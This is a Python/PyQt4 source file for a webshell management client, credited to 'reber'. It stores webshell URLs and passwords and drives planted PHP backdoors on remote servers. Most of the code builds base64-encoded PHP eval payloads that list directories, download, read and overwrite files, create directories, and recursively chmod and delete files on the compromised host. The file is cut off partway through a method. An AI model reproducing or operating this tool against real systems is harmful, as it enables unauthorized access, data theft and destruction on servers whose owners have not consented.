#!/usr/bin/env python
# -*- coding: utf-8 -*-
# code by reber
# 1070018473#qq.com

import os
import sys
import time
import requests
import base64
import urllib
from PyQt4 import QtGui
from PyQt4 import QtCore
from PyQt4 import Qt
# from ui import addNewShell, editShell, editFile, NewFile, AddCmdTab


proxy = {
    'http':'http://127.0.0.1:8080'
}
header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
}

class KTabBar(QtGui.QTabBar):
    #自定义tabbar,实现双击关闭
    def __init__(self,parent = None):
        super(KTabBar, self).__init__()

    def mouseDoubleClickEvent(self, event):
        #获取点击的tab
        tabId = self.tabAt(event.pos())
        #发送关闭信号和tabid
        self.emit(QtCore.SIGNAL("tabCloseRequested(int)"),self.tabAt(event.pos()))
        QtGui.QTabBar.mouseDoubleClickEvent(self, event)

class MainWindow(QtGui.QDialog):
    
    def __init__(self, parent=None):
        super(MainWindow, self).__init__(parent)
        self.setWindowTitle(u'文件管理-by reber')
        self.setWindowIcon(QtGui.QIcon('logo.png'))
        vbox = QtGui.QVBoxLayout(self)
        self.resize(850,500)
        self.tabwidget = QtGui.QTabWidget()
        vbox.addWidget(self.tabwidget)

        self.tabwidget.setTabBar(KTabBar()) # 设置tabwidget的bar
        self.tabwidget.setTabsClosable(True) #允许tab点击关闭
        self.connect(self.tabwidget,QtCore.SIGNAL("tabCloseRequested(int)"),self.closeTab)

        self.addIndexTab()
        self.load_shell()

    def closeTab(self,tabId):
        self.tabwidget.removeTab(tabId)

    def addIndexTab(self):
        self.table = QtGui.QTableWidget()
        self.table.resizeColumnsToContents()
        self.table.setShowGrid(False) # 去掉表格线
        self.table.setColumnCount(3) # 设置列数
        self.table.setHorizontalHeaderLabels(['URL','Lang','Domain'])
        self.table.setColumnWidth(0,400)  #设置第一列的宽度
        self.table.setColumnWidth(1,100)
        self.table.setColumnWidth(2,320)
        self.table.setSelectionBehavior(QtGui.QAbstractItemView.SelectRows) # 设置一次选中一行
        self.table.setEditTriggers(QtGui.QAbstractItemView.NoEditTriggers) # 设置表格禁止编辑
        self.table.verticalHeader().setVisible(False)  # 隐藏垂直表头

        self.table.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)  # 允许右键产生子菜单
        self.table.customContextMenuRequested.connect(self.generateMenu)   # 右键菜单

        self.tabwidget.addTab(self.table,'ShellList') # 添加这个tab到tab控件中

    def generateMenu(self,point): # 添加右键菜单
        print point # 鼠标的位置

        menu = QtGui.QMenu()
        item1 = menu.addAction('NewShell')
        item2 = menu.addAction('About')

        action = menu.exec_(QtGui.QCursor.pos())
        if action == item1:
            self.child_add_shell = addNewShell()
            self.child_add_shell.add_btn.clicked.connect(self.add_shell)
            self.child_add_shell.exec_()
        elif action == item2:
            QtGui.QMessageBox.information( self, "About", "Author: reber" )
        else:
            return

    def load_shell(self):
        self.shlist = []
        data = ''
        if os.path.exists('shell.txt'):
            with open('shell.txt','r') as f:
                data = f.read()
            for x in data.split('***')[:-1]:
                d = {}
                d['url'],d['pwd'] = x.split('||')
                self.shlist.append(d)
        else:
            f = open('shell.txt','w')
            f.close()
        # print self.shlist

        for x in self.shlist:
            url = x.get('url')
            pwd = x.get('pwd')
            current_all_row = self.table.rowCount() # 得到当前总行数
            self.table.setRowCount(current_all_row+1) # 总行数加1

            lbl_url = QtGui.QLabel(url.strip(),self)
            lbl_lange = QtGui.QLabel('  '+url.split('.')[-1],self)
            lbl_domain = QtGui.QLabel('  '+url.split('/')[2])
            self.table.setCellWidget(current_all_row,0,lbl_url)
            self.table.setCellWidget(current_all_row,1,lbl_lange)
            self.table.setCellWidget(current_all_row,2,lbl_domain)
            # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
            # 否则无法使用customContextMenuRequested信号
            lbl_url.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_url.customContextMenuRequested.connect(self.shellMenu)
            lbl_lange.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_lange.customContextMenuRequested.connect(self.shellMenu)

    def add_shell(self):
        url = self.child_add_shell.urlEdit.text()
        pwd = self.child_add_shell.passEdit.text()

        current_all_row = self.table.rowCount() # 得到当前总行数
        self.table.setRowCount(current_all_row+1) # 总行数加1
        lbl_url = QtGui.QLabel(url,self)
        lbl_lang = QtGui.QLabel(url.split('.')[-1],self)
        lbl_domain = QtGui.QLabel(url.split('/')[2])
        self.table.setCellWidget(current_all_row,0,lbl_url)
        self.table.setCellWidget(current_all_row,1,lbl_lang)
        self.table.setCellWidget(current_all_row,2,lbl_domain)
        # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
        # 否则无法使用customContextMenuRequested信号
        lbl_url.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        lbl_url.customContextMenuRequested.connect(self.shellMenu)
        lbl_lang.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        lbl_lang.customContextMenuRequested.connect(self.shellMenu)
        lbl_domain.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        lbl_domain.customContextMenuRequested.connect(self.shellMenu)

        d = {}
        d['url'] = url
        d['pwd'] = pwd
        self.shlist.append(d)

        data = ''
        for x in self.shlist:
            turl = x.get('url')
            tpwd = x.get('pwd')
            data = data +turl+'||'+tpwd+'***'

        with open('shell.txt','w') as f:
            f.write(data)

    def shellMenu(self,point):
        print 'shell',point

        smenu = QtGui.QMenu()
        action1 = smenu.addAction(u'FileManager')
        # action2 = smenu.addAction(u'Cmd')
        action3 = smenu.addAction(u'Edit')
        action4 = smenu.addAction(u'Delete')
        action1.triggered.connect(self.fileManager)
        # action2.triggered.connect(self.cmd)
        action3.triggered.connect(self.doEdit)
        action4.triggered.connect(self.doDelete)
        smenu.exec_(QtGui.QCursor.pos()) # 在当前坐标下显示

    def cmd(self):
        print 'cmd'
        currentrow = self.table.currentRow() # 获得当前行号
        gurl = self.table.cellWidget(currentrow,0).text() # 获得表单中控件的值
        gpwd = self.table.cellWidget(currentrow,1).text()
        self.addcmdtab = AddCmdTab(gurl,gpwd)
        self.tabwidget.addTab(self.addcmdtab,'Cmd')

    def fileManager(self): # 文件管理
        # self.filemanager = 
        print "filemanager"
        currentrow = self.table.currentRow() # 获得当前行号
        gurl = str(self.table.cellWidget(currentrow,0).text()) # 获得表单中控件的值
        domain = str(self.table.cellWidget(currentrow,2).text())
        # gpwd = self.table.cellWidget(currentrow,1).text()
        gpwd = ''
        for x in self.shlist:
            if gurl in x.get('url'):
                gpwd = x.get('pwd')
        print gurl,gpwd
        self.addfiletab = AddFileTab(gurl,gpwd)
        self.tabwidget.addTab(self.addfiletab,domain)
    def doEdit(self):
        currentrow = self.table.currentRow() # 获得当前行号
        gurl = str(self.table.cellWidget(currentrow,0).text()) # 获得表单中控件的值
        # gurl = gurl.split('>')[1].split('<')[0]
        # gpwd = self.table.cellWidget(currentrow,1).text()
        print self.shlist
        gpwd = ''

        for x in range(len(self.shlist)):
            # print gurl
            # print self.shlist[x].get('url')
            if gurl in self.shlist[x].get('url'):
                gpwd = self.shlist[x].get('pwd')
                self.shlist.pop(x)
                break
            else:
                continue
        print self.shlist

        self.child_edit = editShell(gurl, gpwd)
        self.child_edit.edit_btn.clicked.connect(lambda:self.rewrite_shell(currentrow))
        self.child_edit.exec_()
    def rewrite_shell(self,cc):
        url = self.child_edit.urlEdit.text()
        pwd = self.child_edit.passEdit.text()

        current_row_num = cc
        lbl_url = QtGui.QLabel(url,self)
        lbl_lang = QtGui.QLabel(url.split('.')[-1],self)
        lbl_domain = QtGui.QLabel(url.split('/')[2])
        self.table.setCellWidget(current_row_num,0,lbl_url)
        self.table.setCellWidget(current_row_num,1,lbl_lang)
        self.table.setCellWidget(current_row_num,2,lbl_domain)
        # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
        # 否则无法使用customContextMenuRequested信号
        lbl_url.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        lbl_url.customContextMenuRequested.connect(self.shellMenu)
        lbl_lang.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        lbl_lang.customContextMenuRequested.connect(self.shellMenu)
        lbl_domain.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        lbl_domain.customContextMenuRequested.connect(self.shellMenu)

        d = {}
        d['url'] = str(url)
        d['pwd'] = str(pwd)
        self.shlist.append(d)
        print self.shlist

        data = ''
        for x in self.shlist:
            turl = x.get('url')
            tpwd = x.get('pwd')
            data = data +turl+'||'+tpwd+'***'

        with open('shell.txt','w') as f:
            f.write(data)

    def doDelete(self):
        currentrow = self.table.currentRow() # 获得当前行号
        gurl = str(self.table.cellWidget(currentrow,0).text())
        if '>' in gurl:
            gurl = gurl.split('>')[1].split('<')[0]

        for x in range(len(self.shlist)):
            if gurl in self.shlist[x].get('url'):
                self.shlist.pop(x)
                break
            else:
                continue

        data = ''
        for x in self.shlist:
            turl = x.get('url')
            tpwd = x.get('pwd')
            data = data +turl+'||'+tpwd+'***'

        with open('shell.txt','w') as f:
            f.write(data)

        print 'Delete Row: ',currentrow
        self.table.removeRow(currentrow) # 移除当前行

class AddFileTab(QtGui.QTabWidget):
    def __init__(self,url,pwd):
        super(AddFileTab, self).__init__()
        self.url = url
        self.pwd = pwd
        self.path = ''
        self.npath = ''
        self.item = None
        self.resize(800,500)
        self.gird = QtGui.QGridLayout(self)
        self.init_UI()

    def init_UI(self):
        self.ledit = QtGui.QLineEdit()
        tree = TreeClass(self.url,self.pwd,self)
        # tree.setColumnWidth(100,100)
        tree.connect(tree, QtCore.SIGNAL('itemClicked(QTreeWidgetItem*, int)'), self.onClick)
        self.item = tree.item
        # print self.item.text(0)
        self.dirlist = tree.dirlist
        self.filelist = tree.filelist
        self.path = str(tree.path)
        self.ledit.setText(str(tree.path))
        self.table = self.tableset()
        self.setTableContext(self.dirlist,self.filelist)

        self.gird.addWidget(self.ledit,1,0,1,10)
        self.gird.addWidget(tree,2,0,1,2)
        self.gird.addWidget(self.table,2,1,1,9)
        self.gird.setColumnMinimumWidth(0,250)
        # self.gird.setColumnMinimumWidth(1,2000)

    def get_path1(self,item,st): #得到路径
        if item.parent() and item.parent().text(0) != '/':
            p = item.parent()
            st = p.text(0)+'/'+st
            self.get_path1(p,st)
        else:
            self.npath = str('/' + st)

    def onClick(self, item, column):
        self.item = item
        st = item.text(0)
        print st
        sl = ''
        # print self.path
        if ':' in self.path:
            self.get_path(item,st)
        else:
            self.get_path1(item, st)
        # print self.path
        print self.npath
        self.ledit.setText(str(self.npath))
        payload = str(self.pwd+"=@eval(base64_decode($_POST[action]));&action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApOyREPWJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MSJdKTskRj1Ab3BlbmRpcigkRCk7aWYoJEY9PU5VTEwpe2VjaG8oIkVSUk9SOi8vIFBhdGggTm90IEZvdW5kIE9yIE5vIFBlcm1pc3Npb24hIik7fWVsc2V7JE09TlVMTDskTD1OVUxMO3doaWxlKCROPUByZWFkZGlyKCRGKSl7JFA9JEQuIi8iLiROOyRUPUBkYXRlKCJZLW0tZCBIOmk6cyIsQGZpbGVtdGltZSgkUCkpO0AkRT1zdWJzdHIoYmFzZV9jb252ZXJ0KEBmaWxlcGVybXMoJFApLDEwLDgpLC00KTskUj0ifHx8Ii4kVC4ifHx8Ii5AZmlsZXNpemUoJFApLiJ8fHwiLiRFLiJ8fHwiO2lmKEBpc19kaXIoJFApKSRNLj0kTi4iLyIuJFI7ZWxzZSAkTC49JE4uJFI7fWVjaG8gJE0uJEw7QGNsb3NlZGlyKCRGKTt9O2RpZSgpOw==&z1="+base64.b64encode(self.npath))
        html = requests.post(self.url,data=payload,headers=header).content
        print 'html:',html
        l = html.split('|||')[:-1]

        ndl = []
        nfl = []
        for x in range(len(l))[::4]:
            if '/' in l[x]:
                if '.' not in l[x]:
                    dlist = {}
                    dlist['dn'] = l[x][:-1]
                    dlist['dt'] = l[x+1]
                    dlist['ds'] = l[x+2]
                    dlist['dp'] = l[x+3]
                    ndl.append(dlist)
                else:
                    continue
            else:
                flist = {}
                flist['fn'] = l[x]
                flist['ft'] = l[x+1]
                flist['fs'] = l[x+2]
                flist['fp'] = l[x+3]
                nfl.append(flist)

        tdl = []
        tfl = []
        for d in self.dirlist:
            if d not in tdl:
                # print d
                tdl.append(d)
        for f in self.filelist:
            if l not in tfl:
                tfl.append(l)
        self.dirlist = tdl[:]
        self.filelist = tfl[:]

        # print ndl
        # print self.dirlist

        dl = []
        for x in range(len(self.dirlist)):
            for x in self.dirlist:
                dl.append(x['dn'])

        for x in range(len(ndl)):
            if ndl[x]['dn'] not in dl and ndl[x]['dn'] not in str(self.path):
                self.dirlist.append(ndl[x])
                t = QtGui.QTreeWidgetItem()
                t.setText(0,ndl[x]['dn'])
                t.setIcon(0,QtGui.QIcon("dir.ico"))
                item.addChild(t)

        nrow = self.table.rowCount()
        for x in range(nrow)[::-1]:
            self.table.removeRow(x)

        self.table.setRowCount(len(ndl)+len(nfl))

        self.setTableContext(ndl,nfl)

    def setTableContext(self,dlist,flist):
        i = 0
        for x in dlist:
            lbl_dico = QtGui.QLabel(self)
            pix = QtGui.QPixmap("dir.ico")
            lbl_dico.setScaledContents(True)
            lbl_dico.setPixmap(pix)
            if (i%2 == 0):
                lbl_dn = QtGui.QLabel("<font color:#8C8C8C>%s</font>" % x['dn'],self)
                lbl_dt = QtGui.QLabel("<font color:#8C8C8C>%s</font>" % x['dt'],self)
                lbl_ds = QtGui.QLabel("<font color:#8C8C8C>%s</font>" % x['ds'],self)
                lbl_dp = QtGui.QLabel("<font color:#8C8C8C>%s</font>" % x['dp'],self)
            else:
                lbl_dn = QtGui.QLabel("<font color:#080808>%s</font>" % x['dn'],self)
                lbl_dt = QtGui.QLabel("<font color:#080808>%s</font>" % x['dt'],self)
                lbl_ds = QtGui.QLabel("<font color:#080808>%s</font>" % x['ds'],self)
                lbl_dp = QtGui.QLabel("<font color:#080808>%s</font>" % x['dp'],self)
            self.table.setCellWidget(i,0,lbl_dico)
            self.table.setCellWidget(i,1,lbl_dn)
            self.table.setCellWidget(i,2,lbl_dt)
            self.table.setCellWidget(i,3,lbl_ds)
            self.table.setCellWidget(i,4,lbl_dp)
            # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
            # 否则无法使用customContextMenuRequested信号
            lbl_dn.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_dn.customContextMenuRequested.connect(self.dMenu)
            lbl_dt.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_dt.customContextMenuRequested.connect(self.dMenu)
            lbl_ds.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_ds.customContextMenuRequested.connect(self.dMenu)
            lbl_dp.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_dp.customContextMenuRequested.connect(self.dMenu)
            i = i+1

        for x in flist:
            lbl_fico = QtGui.QLabel(self)
            pix = QtGui.QPixmap("file.ico")
            lbl_fico.setScaledContents(True)
            lbl_fico.setPixmap(pix)
            if i%2 == 0:
                lbl_fn = QtGui.QLabel("<font color:#8C8C8C>%s</font>" % x['fn'],self)
                lbl_ft = QtGui.QLabel("<font color:#8C8C8C>%s</font>" % x['ft'],self)
                lbl_fs = QtGui.QLabel("<font color:#8C8C8C>%s</font>" % x['fs'],self)
                lbl_fp = QtGui.QLabel("<font color:#8C8C8C>%s</font>" % x['fp'],self)
            else:
                lbl_fn = QtGui.QLabel("<font color:#080808>%s</font>" % x['fn'],self)
                lbl_ft = QtGui.QLabel("<font color:#080808>%s</font>" % x['ft'],self)
                lbl_fs = QtGui.QLabel("<font color:#080808>%s</font>" % x['fs'],self)
                lbl_fp = QtGui.QLabel("<font color:#080808>%s</font>" % x['fp'],self)
            self.table.setCellWidget(i,0,lbl_fico)
            self.table.setCellWidget(i,1,lbl_fn)
            self.table.setCellWidget(i,2,lbl_ft)
            self.table.setCellWidget(i,3,lbl_fs)
            self.table.setCellWidget(i,4,lbl_fp)
            # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
            # 否则无法使用customContextMenuRequested信号
            lbl_fn.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_fn.customContextMenuRequested.connect(self.fMenu)
            lbl_ft.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_ft.customContextMenuRequested.connect(self.fMenu)
            lbl_fs.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_fs.customContextMenuRequested.connect(self.fMenu)
            lbl_fp.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_fp.customContextMenuRequested.connect(self.fMenu)
            i = i+1

    def dMenu(self,point):
        print point
        smenu = QtGui.QMenu()
        action1 = smenu.addAction(u'Open')
        action2 = smenu.addAction(u'Rename')
        action3 = smenu.addAction(u'Delete')
        action1.triggered.connect(self.dopen)
        action2.triggered.connect(self.rename)
        action3.triggered.connect(self.delete)
        smenu.exec_(QtGui.QCursor.pos()) # 在当前坐标下显示

    def dopen(self):
        print 'dopen'
        QtGui.QMessageBox.warning( self, "Sorry", "Developing......")
    def rename(self):
        print 'rename'
        QtGui.QMessageBox.warning( self, "Sorry", "Developing......")

    def fMenu(self,point):
        print point
        smenu = QtGui.QMenu()
        action1 = smenu.addAction(u'Download')
        action2 = smenu.addAction(u'Edit')
        action3 = smenu.addAction(u'Delete')
        action1.triggered.connect(self.fdownload)
        action2.triggered.connect(self.fedit)
        action3.triggered.connect(self.delete)
        smenu.exec_(QtGui.QCursor.pos()) # 在当前坐标下显示

    def fdownload(self):
        print 'download'
        # tpath = self.path
        st = self.item.text(0)
        if ':' in self.path:
            self.get_path(self.item,st)
        else:
            self.get_path1(self.item, st)
        currentrow = self.table.currentRow() # 获得当前行号
        filename = self.table.cellWidget(currentrow,1).text() # 获得表单中控件的值
        filename = filename.split('>')[1].split('<')[0]
        downfilename = str(self.npath+'/'+filename) #带文件名的路径
        print downfilename

        payload = str(self.pwd+"=@eval(base64_decode($_POST[action]));&action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oInx8fCIpOzskRj1nZXRfbWFnaWNfcXVvdGVzX2dwYygpP2Jhc2U2NF9kZWNvZGUoc3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSkpOmJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MSJdKTskZnA9QGZvcGVuKCRGLCJyIik7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oIkVSUk9SOi8vIENhbiBOb3QgUmVhZCIpO307ZWNobygifHx8Iik7ZGllKCk7&z1="+base64.b64encode(downfilename))
        html = requests.post(self.url,data=payload,headers=header).content
        print 'html: ',html
        if 'ERROR' in html:
            QtGui.QMessageBox.warning( self, "Error", "No Permission!")
        else:
            l = html.split('|||')[1]
            # 保存文件
            fname = QtGui.QFileDialog.getSaveFileName(self, 'down',filename)
            if fname:
                with open(fname,'w') as f:
                    f.write(str(l))
        # self.npath = tpath
    def fedit(self):
        print 'fedit'
        # tpath = self.npath
        st = self.item.text(0)
        if ':' in self.path:
            self.get_path(self.item,st)
        else:
            self.get_path1(self.item, st)
        currentrow = self.table.currentRow() # 获得当前行号
        filename = str(self.table.cellWidget(currentrow,1).text()) # 获得表单中控件的值
        if '>' in filename:
            filename = filename.split('>')[1].split('<')[0]
        self.editfilename = str(self.npath+'/'+filename) #带文件名的路径

        payload = str(self.pwd+"=@eval(base64_decode($_POST[action]));&action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oInx8fCIpOzskRj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JFA9QGZvcGVuKCRGLCJyIik7ZWNobyhodG1sZW50aXRpZXMoQGZyZWFkKCRQLGZpbGVzaXplKCRGKSkpKTtAZmNsb3NlKCRQKTs7ZWNobygifHx8Iik7ZGllKCk7&z1="+base64.b64encode(self.editfilename))
        html = requests.post(self.url,data=payload,headers=header).text
        print 'html:',html # 弹窗修改文件
        text = html.split('|||')[1]
        # print text

        self.editfile = editFile(str(text))
        self.editfile.btn.clicked.connect(self.savefile)
        self.editfile.exec_()

        # self.npath = tpath

    def savefile(self):
        content = str(self.editfile.fileEdit.toPlainText())

        payload = str(self.pwd+"=@eval(base64_decode($_POST[action]));&action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oInx8fCIpOztlY2hvIEBmd3JpdGUoZm9wZW4oYmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pLCJ3IiksYmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pKT8iMSI6IjAiOztlY2hvKCJ8fHwiKTtkaWUoKTs=&z1="+base64.b64encode(self.editfilename)+"&z2="+base64.b64encode(content))
        html = requests.post(self.url,data=payload,headers=header).content
        # print html # 弹窗修改文件
        print 'html:',html
        if '1' in html:
            print 'save success'
        else:
            QtGui.QMessageBox.warning( self, "Error", "No Permission!")

    def delete(self):
        # tpath = self.npath
        print 'delete'
        st = self.item.text(0)
        if ':' in self.path:
            self.get_path(self.item,st)
        else:
            self.get_path1(self.item, st)
        currentrow = self.table.currentRow() # 获得当前行号
        filename = self.table.cellWidget(currentrow,1).text() # 获得表单中控件的值
        filename = filename.split('>')[1].split('<')[0]
        print self.npath
        delfilename = str(self.npath+'/'+filename)
        print delfilename

        payload = str(self.pwd+"=@eval(base64_decode($_POST[action]));&action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oInx8fCIpOztmdW5jdGlvbiBkZigkcCl7JG09QGRpcigkcCk7d2hpbGUoQCRmPSRtLT5yZWFkKCkpeyRwZj0kcC4iLyIuJGY7aWYoKGlzX2RpcigkcGYpKSYmKCRmIT0iLiIpJiYoJGYhPSIuLiIpKXtAY2htb2QoJHBmLDA3NzcpO2RmKCRwZik7fWlmKGlzX2ZpbGUoJHBmKSl7QGNobW9kKCRwZiwwNzc3KTtAdW5saW5rKCRwZik7fX0kbS0%2BY2xvc2UoKTtAY2htb2QoJHAsMDc3Nyk7cmV0dXJuIEBybWRpcigkcCk7fSRGPWdldF9tYWdpY19xdW90ZXNfZ3BjKCk/YmFzZTY0X2RlY29kZShzdHJpcHNsYXNoZXMoJF9QT1NUWyJ6MSJdKSk6YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pO2lmKGlzX2RpcigkRikpZWNobyhkZigkRikpO2Vsc2V7ZWNobyhmaWxlX2V4aXN0cygkRik/QHVubGluaygkRik/IjEiOiIwIjoiMCIpO307ZWNobygifHx8Iik7ZGllKCk7&z1="+base64.b64encode(delfilename))
        # print payload
        html = requests.post(self.url,data=payload,headers=header).content
        if '1' in html:
            self.table.removeRow(currentrow)
        else:
            QtGui.QMessageBox.warning( self, "Error", "No Permission!")

        # self.npath = tpath

    def get_path(self,item,st): #得到路径
        if item.parent():
            p = item.parent()
            st = p.text(0)+'/'+st
            self.get_path(p,st)
        else:
            sl = str(st).split('/')
            sl[0] = sl[0] + ':'
            self.npath = '/'.join(sl)

    def tableset(self):
        table = QtGui.QTableWidget(self)
        # table.resizeColumnsToContents()
        table.setShowGrid(False) # 去掉表格线
        table.setColumnCount(5) # 设置列数
        table.setRowCount(len(self.dirlist)+len(self.filelist))
        table.setColumnWidth(0,30)
        table.setColumnWidth(1,220)  #设置第一列的宽度
        table.setColumnWidth(2,150)
        table.setColumnWidth(3,70)
        table.setColumnWidth(4,50)
        table.setHorizontalHeaderLabels(['','File','Date','Size','Perm'])
        table.setSelectionBehavior(QtGui.QAbstractItemView.SelectRows) # 设置一次选中一行
        # table.setEditTriggers(QtGui.QAbstractItemView.NoEditTriggers) # 设置表格禁止编辑
        table.verticalHeader().setVisible(False)  # 隐藏垂直表头

        table.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)  # 允许右键产生子菜单
        table.customContextMenuRequested.connect(self.generateMenu)   # 右键菜单
        return table


    def generateMenu(self,point): # 添加右键菜单
        print point # 鼠标的位置

        menu = QtGui.QMenu()
        item1 = menu.addAction('upload')
        item2 = menu.addAction('adddir')
        item3 = menu.addAction('addfile')

        action = menu.exec_(QtGui.QCursor.pos())
        if action == item1:
            self.upload()
        elif action == item2:
            self.adddir()
        elif action == item3:
            self.addfile()
        else:
            return

    def addfile(self):
        self.addnewfile = NewFile()
        self.addnewfile.btn.clicked.connect(self.addf)
        self.addnewfile.exec_()

    def addf(self):
        title = self.addnewfile.text_name.text()
        content = str(self.addnewfile.content.toPlainText())

        tpath = self.npath
        st = self.item.text(0)
        if ':' in self.path:
            self.get_path(self.item, st) # 得到路径
        else:
            self.get_path1(self.item, st)

        fname = str(self.npath+'/'+title)
        print fname

        payload = str(self.pwd+"=@eval(base64_decode($_POST[action]));&action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oInx8fCIpOztlY2hvIEBmd3JpdGUoZm9wZW4oYmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pLCJ3IiksYmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pKT8iMSI6IjAiOztlY2hvKCJ8fHwiKTtkaWUoKTs=&z1="+base64.b64encode(fname)+'&z2='+base64.b64encode(content))
        html = requests.post(self.url,data=payload,headers=header).content
        print 'html',html
        if '1' in html:
            current_all_row = self.table.rowCount() # 得到当前总行数
            self.table.setRowCount(current_all_row+1) # 总行数加1

            lbl_fico = QtGui.QLabel(self)
            pix = QtGui.QPixmap("file.ico")
            lbl_fico.setScaledContents(True)
            lbl_fico.setPixmap(pix)
            lbl_fn = QtGui.QLabel(title,self)
            lbl_ft = QtGui.QLabel(time.strftime("%Y-%m-%d %H:%M:%S",time.localtime(time.time())),self)
            lbl_fs = QtGui.QLabel(str(len(content)),self)
            lbl_fp = QtGui.QLabel('xxx',self)
            self.table.setCellWidget(current_all_row,0,lbl_fico)
            self.table.setCellWidget(current_all_row,1,lbl_fn)
            self.table.setCellWidget(current_all_row,2,lbl_ft)
            self.table.setCellWidget(current_all_row,3,lbl_fs)
            self.table.setCellWidget(current_all_row,4,lbl_fp)
            # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
            # 否则无法使用customContextMenuRequested信号
            lbl_fn.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_fn.customContextMenuRequested.connect(self.fMenu)
            lbl_ft.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_ft.customContextMenuRequested.connect(self.fMenu)
            lbl_fs.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_fs.customContextMenuRequested.connect(self.fMenu)
            lbl_fp.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_fp.customContextMenuRequested.connect(self.fMenu)

            print 'add file success.'
        else:
            QtGui.QMessageBox.warning( self, "Error", "No Permission!")

        self.npath = tpath

    def adddir(self):
        self.addnewdir = NewDir()
        self.addnewdir.btn.clicked.connect(self.addd)
        self.addnewdir.exec_()
    def addd(self):
        ndirname = self.addnewdir.text_name.text()

        # tpath = self.npath
        st = self.item.text(0)
        if ":" in self.path:
            self.get_path(self.item, st) # 得到路径
        else:
            self.get_path1(self.item, st)

        dirname = str(self.npath+'/'+ndirname)
        print dirname

        payload = str(self.pwd+"=@eval(base64_decode($_POST[action]));&action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oInx8fCIpOzskbT1nZXRfbWFnaWNfcXVvdGVzX2dwYygpOyRmPSRtP2Jhc2U2NF9kZWNvZGUoc3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSkpOmJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MSJdKTtlY2hvKG1rZGlyKCRmKT8iMSI6IjAiKTs7ZWNobygifHx8Iik7ZGllKCk7&z1="+base64.b64encode(dirname))
        html = requests.post(self.url,data=payload,headers=header).content
        print 'html',html
        if '1' in html:
            current_all_row = self.table.rowCount() # 得到当前总行数
            self.table.setRowCount(current_all_row+1) # 总行数加1

            lbl_dico = QtGui.QLabel(self)
            pix = QtGui.QPixmap("dir.ico")
            lbl_dico.setScaledContents(True)
            lbl_dico.setPixmap(pix)
            lbl_dn = QtGui.QLabel(ndirname,self)
            lbl_dt = QtGui.QLabel(time.strftime("%Y-%m-%d %H:%M:%S",time.localtime(time.time())),self)
            lbl_ds = QtGui.QLabel('4096',self)
            lbl_dp = QtGui.QLabel('xxx',self)
            self.table.setCellWidget(current_all_row,0,lbl_dico)
            self.table.setCellWidget(current_all_row,1,lbl_dn)
            self.table.setCellWidget(current_all_row,2,lbl_dt)
            self.table.setCellWidget(current_all_row,3,lbl_ds)
